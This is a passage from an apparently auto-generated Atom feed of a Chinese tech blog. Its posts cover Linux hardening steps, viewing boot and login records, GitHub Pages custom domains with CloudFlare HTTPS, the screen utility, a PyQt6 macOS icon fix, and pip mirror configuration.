class="code"><pre><span class="line">查找，find &#x2F; -maxdepth 3 -name .netrc 2&gt;&#x2F;dev&#x2F;null，重命名或者删除</span><br></pre></td></tr></table></figure><p><strong>2 删除hosts.equiv文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -maxdepth 3 -name hosts.equiv 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p><strong>3 删除.rhosts 文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -maxdepth 3 -name .rhosts 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p><strong>4 关闭不必要的服务和端口</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --list</span><br><span class="line">chkconfig [--level levels] 服务名 off</span><br></pre></td></tr></table></figure><p><strong>5 删除系统banner信息，避免泄漏操作系统泄漏</strong></p><p>删除或重命名”/etc”目录下的 issue.net 和 issue 文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv &#x2F;etc&#x2F;issue &#x2F;etc&#x2F;issue.bak</span><br><span class="line">mv &#x2F;etc&#x2F;issue.net &#x2F;etc&#x2F;issue.net.bak</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;一、账号口令&quot;&gt;&lt;a href=&quot;#一、账号口令&quot; class=&quot;headerlink&quot; title=&quot;一、账号口令&quot;&gt;&lt;/a&gt;一、账号口令&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;1 配置口令最小长度&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;在文件/etc/login.defs中设置 PASS_MIN_LEN，参考值：8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;2 配置口令生存周期&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;在文件/etc/login.defs中设置 PASS_MAX_DAYS，参考值：90&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;3 配置密码复杂度策略&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;  CentOS系统：修改/etc/pam.d/system-auth文件, 在ucredit=-1 lcredit=-1 dcredit=-1 ocredit=-1 选3种，追加到password requisite pam_cracklib.so后面，添加到配置文件中。
    
    </summary>
    
    
      <category term="Linux" scheme="http://yoursite.com/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Linux开机和关机记录查看</title>
    <link href="http://yoursite.com/2021/linux%E8%AE%B0%E5%BD%95%E6%9F%A5%E7%9C%8B.html"/>
    <id>http://yoursite.com/2021/linux%E8%AE%B0%E5%BD%95%E6%9F%A5%E7%9C%8B.html</id>
    <published>2021-04-11T07:05:39.000Z</published>
    <updated>2021-04-14T06:23:32.699Z</updated>
    
    <content type="html"><![CDATA[<h3 id="查看最近一次开机时间"><a href="#查看最近一次开机时间" class="headerlink" title="查看最近一次开机时间"></a>查看最近一次开机时间</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; who -b</span><br><span class="line">或者</span><br><span class="line">&gt; last -1 reboot</span><br></pre></td></tr></table></figure><h3 id="查看关机记录"><a href="#查看关机记录" class="headerlink" title="查看关机记录"></a>查看关机记录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; last -x | grep shutdown <span class="comment">#以关机时间段显示</span></span><br></pre></td></tr></table></figure><h3 id="查看失败登录记录-来源以IP显示"><a href="#查看失败登录记录-来源以IP显示" class="headerlink" title="查看失败登录记录, 来源以IP显示"></a><a id="more"></a>查看失败登录记录, 来源以IP显示</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; sudo lastb -i</span><br></pre></td></tr></table></figure><h3 id="查看系统从上次开机到现在已经运行多久了"><a href="#查看系统从上次开机到现在已经运行多久了" class="headerlink" title="查看系统从上次开机到现在已经运行多久了"></a>查看系统从上次开机到现在已经运行多久了</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; uptime</span><br><span class="line">或者</span><br><span class="line">&gt; w</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;查看最近一次开机时间&quot;&gt;&lt;a href=&quot;#查看最近一次开机时间&quot; class=&quot;headerlink&quot; title=&quot;查看最近一次开机时间&quot;&gt;&lt;/a&gt;查看最近一次开机时间&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;gt; who -b&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;或者&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;gt; last -1 reboot&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;查看关机记录&quot;&gt;&lt;a href=&quot;#查看关机记录&quot; class=&quot;headerlink&quot; title=&quot;查看关机记录&quot;&gt;&lt;/a&gt;查看关机记录&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;gt; last -x | grep shutdown &lt;span class=&quot;comment&quot;&gt;#以关机时间段显示&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;查看失败登录记录-来源以IP显示&quot;&gt;&lt;a href=&quot;#查看失败登录记录-来源以IP显示&quot; class=&quot;headerlink&quot; title=&quot;查看失败登录记录, 来源以IP显示&quot;&gt;&lt;/a&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="http://yoursite.com/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
      <category term="Network" scheme="http://yoursite.com/tags/Network/"/>
    
  </entry>
  
  <entry>
    <title>如何拥有多个GitHub Pages</title>
    <link href="http://yoursite.com/2021/gitpage.html"/>
    <id>http://yoursite.com/2021/gitpage.html</id>
    <published>2021-04-08T05:54:46.000Z</published>
    <updated>2021-04-14T06:12:48.668Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h2 id="只能为每个-GitHub-帐户创建一个用户或组织站点；而项目站点没有限制"><a href="#只能为每个-GitHub-帐户创建一个用户或组织站点；而项目站点没有限制" class="headerlink" title="只能为每个 GitHub 帐户创建一个用户或组织站点；而项目站点没有限制"></a>只能为每个 GitHub 帐户创建一个用户或组织站点；而项目站点没有限制</h2></blockquote><p>​    也就是名为 <code>&lt;user&gt;.github.io</code>的仓库。<strong>想要创建更多的GitHub Pages页面，可以通过创建项目站点实现。</strong>项目站点的数量没有限制</p><p>​    有三种类型的 GitHub Pages 站点：项目、用户和组织。 项目站点连接到 GitHub 上托管的特定项目。 用户和组织站点连接到特定的 GitHub 帐户。</p><p>​    要发布用户站点，必须创建名为 <code>&lt;user&gt;.github.io</code> 的用户帐户所拥有的仓库。 要发布组织站点，必须创建名为 <code>&lt;organization&gt;.github.io</code> 的组织所拥有的仓库。 除非您使用自定义域，否则用户和组织站点位于 <code>http(s)://&lt;username&gt;.github.io</code> 或 <code>http(s)://&lt;organization&gt;.github.io</code>。<a id="more"></a></p><h3 id="一、创建项目"><a href="#一、创建项目" class="headerlink" title="一、创建项目"></a>一、创建项目</h3><ol><li>新建一个仓库，名称随意。</li><li>进入仓库主页，点击右面的<code>Settings</code>，找到<strong>GitHub Pages</strong>部分，选择Source&gt;main即可。</li><li>建议勾选 <code>Enforce HTTPS</code>，否则访问时会出现安全警告。</li><li>没有出错的话，一个项目主页就建立完成了，可以通过<code>&lt;username&gt;.github.io/&lt;projectname&gt;</code>访问到了</li></ol><p>这里我新建的项目为<code>TBOsec.github.io/DownGit</code> 。可以看到这个地址有点丑，而且地址对大小写敏感。我希望通过 <code>downgit.h0sec.com</code> 这样更加美观的地址访问，那么就需要设置和绑定子域名。</p><h3 id="二、绑定子域名"><a href="#二、绑定子域名" class="headerlink" title="二、绑定子域名"></a>二、绑定子域名</h3><p><u>通常，当我们购买一个域名后，就可以使用它的子域名。子域名的数量、子域名长度的限制各个域名商会有所不同</u></p><p>以我为例，我的域名为<code>h0sec.com</code>，我希望使用<code>downgit.h0sec.com</code> 这个子域名</p><ol><li>在项目仓库里新建一个<code>CNAME</code>文件，并将不带协议名的裸域名写进去（<code>downgit.h0sec.com</code>而不是<code>https://downgit.h0sec.com/</code>）</li><li>去DNS服务商的网站，给对应的二级域名添加<strong><code>CNAME</code></strong>解析到<code>&lt;username&gt;.github.io</code>（和个人主页的相同）</li><li>等待DNS生效，具体时间和服务商有关 <!--大约几分钟--></li><li>成功后，可以通过更好看的 downgit.h0sec.com` 地址访问到了项目站点了</li></ol><img src="../images/upload/202104081.png" style="zoom:67%;" /><h3 id="三、启用HTTPS"><a href="#三、启用HTTPS" class="headerlink" title="三、启用HTTPS"></a>三、启用HTTPS</h3><p>虽然现在可以通过<code>downgit.h0sec.com</code>访问，但是无法使用https，这是GitHub Pages本身的限制</p><img src="../images/upload/202104082.png" style="zoom:50%;" /><p>首先，为什么要使用 https 协议？因为 https 协议提高网站访问安全性、目前越来越多的浏览器会判断当前站点支不支持https协议。</p><p>​    默认情况下使用GitHub Pages的给定域名则支持http和https两种协议，但是如果使用自定义域名的话，则只能通过<code>http://</code>访问，也就是说我们在<code>Github上搭建 Hexo 或Jekyll 主题博客</code>后，通过<code>CNAME</code>绑定个人域名后，我们只能通过<code>http://</code>域名来访问。</p><p>​    如果访问<code>https://XXX.github.io/</code>(即原来的GitHub Pages域名)将会被重定向到<code>我们的自定义域名</code>。但若直接访问<code>https://我们的自定义域名</code>，浏览器会报<code>SSL_DOMAIN_NOT_MATCHED</code>警告。</p><p><u><strong>那么怎么给自己的域名加上<code>https</code>呢？</strong></u></p><p>​    <strong><a href="https://www.cloudflare.com/zh-cn/" target="_blank" rel="noopener">CloudFlare</a></strong> 是一家CDN提供商，它提供了<code>免费的https服务</code>(但不是应用SSL证书)。实现模式就是，用户到CDN服务器的连接为<code>https</code>，而CDN服务器到GithubPage服务器的连接为<code>http</code>，就是在CDN服务器那里加上反向代理。</p><ol><li>注册并登录CloudFlare，并将自己域名下的<code>name server</code>修改为CloudFlare的<code>name server</code>。</li><li>在CloudFlare的DNS设置域名匹配到自己的GithubPage(启用动态DNS加速)。</li><li>在CloudFlare的<strong><code>SSL/TLS</code></strong>设置SSL/TLS为<code>完全</code>   (等待一定时间实现建立连接后，就可以通过<code>https</code>来访问自己的 GithubPage )。</li><li>在CloudFlare的<code>边缘证书</code>中设置路由规则。一般情况下，设置<code>始终使用HTTPS</code>， 这样就可以把 <code>http</code> 链接强制转换为 <code>https</code>。</li></ol><img src="../images/upload/202104083.png" style="zoom:50%;" /><img src="../images/upload/202104084.png" style="zoom:50%;" /><p>这样不管通过http访问将跳转到https，正常访问</p><img src="../images/upload/202104085.png" style="zoom:50%;" />]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;h2 id=&quot;只能为每个-GitHub-帐户创建一个用户或组织站点；而项目站点没有限制&quot;&gt;&lt;a href=&quot;#只能为每个-GitHub-帐户创建一个用户或组织站点；而项目站点没有限制&quot; class=&quot;headerlink&quot; title=&quot;只能为每个 GitHub 帐户创建一个用户或组织站点；而项目站点没有限制&quot;&gt;&lt;/a&gt;只能为每个 GitHub 帐户创建一个用户或组织站点；而项目站点没有限制&lt;/h2&gt;&lt;/blockquote&gt;
&lt;p&gt;​    也就是名为 &lt;code&gt;&amp;lt;user&amp;gt;.github.io&lt;/code&gt;的仓库。&lt;strong&gt;想要创建更多的GitHub Pages页面，可以通过创建项目站点实现。&lt;/strong&gt;项目站点的数量没有限制&lt;/p&gt;
&lt;p&gt;​    有三种类型的 GitHub Pages 站点：项目、用户和组织。 项目站点连接到 GitHub 上托管的特定项目。 用户和组织站点连接到特定的 GitHub 帐户。&lt;/p&gt;
&lt;p&gt;​    要发布用户站点，必须创建名为 &lt;code&gt;&amp;lt;user&amp;gt;.github.io&lt;/code&gt; 的用户帐户所拥有的仓库。 要发布组织站点，必须创建名为 &lt;code&gt;&amp;lt;organization&amp;gt;.github.io&lt;/code&gt; 的组织所拥有的仓库。 除非您使用自定义域，否则用户和组织站点位于 &lt;code&gt;http(s)://&amp;lt;username&amp;gt;.github.io&lt;/code&gt; 或 &lt;code&gt;http(s)://&amp;lt;organization&amp;gt;.github.io&lt;/code&gt;。
    
    </summary>
    
    
      <category term="Programming" scheme="http://yoursite.com/categories/Programming/"/>
    
    
      <category term="Network" scheme="http://yoursite.com/tags/Network/"/>
    
      <category term="git" scheme="http://yoursite.com/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>screen后台运行程序</title>
    <link href="http://yoursite.com/2021/screen.html"/>
    <id>http://yoursite.com/2021/screen.html</id>
    <published>2021-03-15T05:01:17.000Z</published>
    <updated>2021-04-16T05:57:59.093Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>常常需要远程登录到Linux 服务器，运行一些需要很长时间才能完成的任务，在此期间不能关掉窗口或者断开连接，否则这个任务就会被杀掉，一切半途而废了。</p></blockquote><p>screen命令可以实现当前窗口与任务分离，即使离线了，服务器仍在后台运行任务。当重新登录服务器，可以读取窗口线程，重新连接任务窗口 <a id="more"></a></p><h2 id="主要功能："><a href="#主要功能：" class="headerlink" title="主要功能："></a>主要功能：</h2><ul><li>会话恢复</li></ul><p>只要Screen本身没有终止，在其内部运行的会话都可以恢复。这一点对于远程登录的用户特别有用——即使网络连接中断，用户也不会失去对已经打开的命令行会话的控制。只要再次登录到主机上执行screen -r就可以恢复会话的运行。同样在暂时离开的时候，也可以执行分离命令detach，在保证里面的程序正常运行的情况下让Screen挂起（切换到后台）。这一点和图形界面下的VNC很相似。</p><ul><li>多窗口</li></ul><p>在Screen环境下，所有的会话都独立的运行，并拥有各自的编号、输入、输出和窗口缓存。用户可以通过快捷键在不同的窗口下切换，并可以自由的重定向各个窗口的输入和输出。Screen实现了基本的文本操作，如复制粘贴等；还提供了类似滚动条的功能，可以查看窗口状况的历史记录。窗口还可以被分区和命名，还可以监视后台窗口的活动。</p><ul><li>会话共享</li></ul><p>Screen可以让一个或多个用户从不同终端多次登录一个会话，并共享会话的所有特性（比如可以看到完全相同的输出）。它同时提供了窗口访问权限的机制，可以对窗口进行密码保护。</p><h2 id="screen的使用："><a href="#screen的使用：" class="headerlink" title="screen的使用："></a>screen的使用：</h2><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>一般的linux系统都会自带screen,如果没有安装的话，使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install screen</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo yum install screen</span><br></pre></td></tr></table></figure><h4 id="新建窗口"><a href="#新建窗口" class="headerlink" title="新建窗口"></a>新建窗口</h4><p>新建窗口有<code>3</code>种办法</p><p>第一种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ screen</span><br><span class="line">这样就可以新建窗口，进入到一个窗口中，但是这样窗口就没有名字，无法区分他们</span><br></pre></td></tr></table></figure><p>第二种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ screen -S name </span><br><span class="line">例如：screen -S count 新建了一个叫count的窗口并进入</span><br><span class="line">这样新建一个名字为name的窗口，并入到该窗口中</span><br></pre></td></tr></table></figure><p>第三种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ screen command</span><br><span class="line">例如：screen python .&#x2F;a.py 新建并执行a.py程序</span><br><span class="line">这样新建一个窗口并在窗口中执行command，同样没有名字</span><br></pre></td></tr></table></figure><h4 id="会话分离"><a href="#会话分离" class="headerlink" title="会话分离"></a>会话分离</h4><p>当一个窗口运行某个程序之后，想退出登录，让程序在后台运行。这时就需要和窗口会话分离,有<code>2</code>种方式：</p><p>第一种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ctrl+a+d</span><br><span class="line">在当前会话窗口中按Ctrl+a+d快捷键可以实现分离，这时窗口会弹出[detached]的提示，并回到主窗口</span><br></pre></td></tr></table></figure><p>第二种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ screen -d name </span><br><span class="line">远程detach某个session,前提是已经跳出了name窗口</span><br></pre></td></tr></table></figure><h4 id="恢复会话窗口"><a href="#恢复会话窗口" class="headerlink" title="恢复会话窗口"></a>恢复会话窗口</h4><p>首先查看有哪些窗口正在运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ screen -ls </span><br><span class="line">列出窗口列表</span><br></pre></td></tr></table></figure><p><img src="../images/upload/screen1.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ screen -r 22059</span><br><span class="line">进入22059线程，恢复test会话</span><br></pre></td></tr></table></figure><p>这样就能回到test窗口了</p><h4 id="杀死会话窗口"><a href="#杀死会话窗口" class="headerlink" title="杀死会话窗口"></a>杀死会话窗口</h4><p>如果想要关掉某个窗口，有<code>3</code>种方法：</p><p>第一种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ kill -9 threadnum</span><br><span class="line">例如上面的22059，kill -9 22059即可杀死线程</span><br></pre></td></tr></table></figure><p>第二种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ctrl+a+k</span><br><span class="line">杀死当前窗口和窗口中运行的程序</span><br></pre></td></tr></table></figure><p>第三种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ctrl+a 进入命令模式，然后输入quite命令</span><br><span class="line">$ quite</span><br><span class="line">这样退出会杀死所有窗口并退出运行的所有程序</span><br></pre></td></tr></table></figure><h4 id="清除死去的窗口"><a href="#清除死去的窗口" class="headerlink" title="清除死去的窗口"></a>清除死去的窗口</h4><p>当窗口被杀死后，再用screen -ls 可以看到该窗口后面的(???dead)字样，说明窗口死了，但是仍在占用空间。这时需要清除窗口</p><p><img src="../images/upload/screen2.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ screen -wipe</span><br><span class="line">自动清除死去的窗口</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;常常需要远程登录到Linux 服务器，运行一些需要很长时间才能完成的任务，在此期间不能关掉窗口或者断开连接，否则这个任务就会被杀掉，一切半途而废了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;screen命令可以实现当前窗口与任务分离，即使离线了，服务器仍在后台运行任务。当重新登录服务器，可以读取窗口线程，重新连接任务窗口
    
    </summary>
    
    
      <category term="Linux" scheme="http://yoursite.com/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>macOS下PyQt6图标icon无法显示</title>
    <link href="http://yoursite.com/2021/PyQt6%E5%9B%BE%E6%A0%87.html"/>
    <id>http://yoursite.com/2021/PyQt6%E5%9B%BE%E6%A0%87.html</id>
    <published>2021-03-01T07:22:05.000Z</published>
    <updated>2021-04-14T06:12:48.666Z</updated>
    
    <content type="html"><![CDATA[<p>刚使用PyQt6时遇到图标无法显示问题，几番查询总算解决，直接看代码<a id="more"></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PyQt6.QtCore <span class="keyword">import</span> QFile</span><br><span class="line"><span class="keyword">from</span> PyQt6.QtGui <span class="keyword">import</span> QIcon, QPixmap</span><br><span class="line"><span class="keyword">from</span> PyQt6.QtWidgets <span class="keyword">import</span> QApplication, QPushButton, QWidget</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyIcon</span><span class="params">(QWidget)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        super().__init__()</span><br><span class="line">        self.setupGUI()  <span class="comment">#创建窗口</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setupGUI</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.setWindowTitle(<span class="string">'Icon'</span>)</span><br><span class="line">        self.resize(<span class="number">400</span>, <span class="number">200</span>)  <span class="comment">#设置窗口大小</span></span><br><span class="line">        <span class="comment"># self.setWindowIcon(QIcon('./alarm.svg')))</span></span><br><span class="line">        </span><br><span class="line">        button = QPushButton(QIcon(<span class="string">'./alarm.svg'</span>), <span class="string">'Click me'</span>, self)</span><br><span class="line">        button.setToolTip(<span class="string">"This is Click"</span>)</span><br><span class="line">        button.setGeometry(<span class="number">150</span>, <span class="number">100</span>, <span class="number">100</span>, <span class="number">50</span>)  <span class="comment">#设置按钮坐标和大小</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app = QApplication(sys.argv)</span><br><span class="line">    path = <span class="string">'./alarm.svg'</span></span><br><span class="line">    app.setWindowIcon(QIcon(QPixmap(path)))  <span class="comment"># MAC下程序图标是显示在程序坞中，切记!</span></span><br><span class="line"></span><br><span class="line">    form = MyIcon()</span><br><span class="line">    form.show()</span><br><span class="line"></span><br><span class="line">    sys.exit(app.exec())  <span class="comment">#退出主循环</span></span><br></pre></td></tr></table></figure><p>setWindowIcon是QApplication的方法，而不是QWidget的，所以使用app.setWindowIcon设置是对的<br>注意：<font color=red>在macOS下，图标是显示在程序坞中！！！</font>&gt;</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;刚使用PyQt6时遇到图标无法显示问题，几番查询总算解决，直接看代码
    
    </summary>
    
    
      <category term="Programming" scheme="http://yoursite.com/categories/Programming/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>pip更换国内源</title>
    <link href="http://yoursite.com/2021/python%E6%9B%B4%E6%8D%A2%E6%BA%90.html"/>
    <id>http://yoursite.com/2021/python%E6%9B%B4%E6%8D%A2%E6%BA%90.html</id>
    <published>2021-02-02T16:00:00.000Z</published>
    <updated>2021-04-14T06:12:48.664Z</updated>
    
    <content type="html"><![CDATA[<h3 id="pip国内的一些镜像"><a href="#pip国内的一些镜像" class="headerlink" title="pip国内的一些镜像"></a>pip国内的一些镜像</h3><ul><li>阿里云 <a href="http://mirrors.aliyun.com/pypi/simple/?spm=a2c6h.12873639.0.0.22b62cdbVtYOZm" target="_blank" rel="noopener">http://mirrors.aliyun.com/pypi/simple/</a></li><li>中国科技大学 <a href="https://pypi.mirrors.ustc.edu.cn/simple/" target="_blank" rel="noopener">https://pypi.mirrors.ustc.edu.cn/simple/</a></li><li>豆瓣(douban) <a href="http://pypi.douban.com/simple/" target="_blank" rel="noopener">http://pypi.douban.com/simple/</a></li><li>清华大学 <a href="https://pypi.tuna.tsinghua.edu.cn/simple/" target="_blank" rel="noopener">https://pypi.tuna.tsinghua.edu.cn/simple/</a></li><li>中国科学技术大学 <a href="http://pypi.mirrors.ustc.edu.cn/simple/" target="_blank" rel="noopener">http://pypi.mirrors.ustc.edu.cn/simple/</a></li></ul><p><u>提示：若担心安全问题可使用HTTPS加密源</u></p><h3 id="修改源的方法"><a href="#修改源的方法" class="headerlink" title="修改源的方法"></a>修改源的方法</h3><h4 id="临时使用："><a href="#临时使用：" class="headerlink" title="临时使用："></a>临时使用：</h4><p>Linux Mac Windows通用命令<a id="more"></a></p><p>可以在使用pip时在后面加上-i参数，指定pip源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install Openpyxl -i https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F;</span><br></pre></td></tr></table></figure><p><u>注意：如果使用非HTTPS源，需加上–trusted-host参数</u><br>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install django -i http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F; --trusted-host mirrors.aliyun.com</span><br></pre></td></tr></table></figure><h4 id="永久修改："><a href="#永久修改：" class="headerlink" title="永久修改："></a>永久修改：</h4><p><strong>Linux:</strong></p><p>修改pip.cof文件(没有就创建一个)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$HOME&#x2F;.config&#x2F;pip&#x2F;pip.conf</span><br></pre></td></tr></table></figure><p>修改内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url &#x3D; https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F;</span><br></pre></td></tr></table></figure><p><strong>Mac:</strong></p><p>修改pip.conf文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$HOME&#x2F;Library&#x2F;Application Support&#x2F;pip&#x2F;pip.conf</span><br></pre></td></tr></table></figure><p>如果没有上面的目录,在如下目录创建 pip.conf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url &#x3D; https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F;</span><br></pre></td></tr></table></figure><p><strong>Windows:</strong><br>修改 pip.conf 文件 (没有就创建一个)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 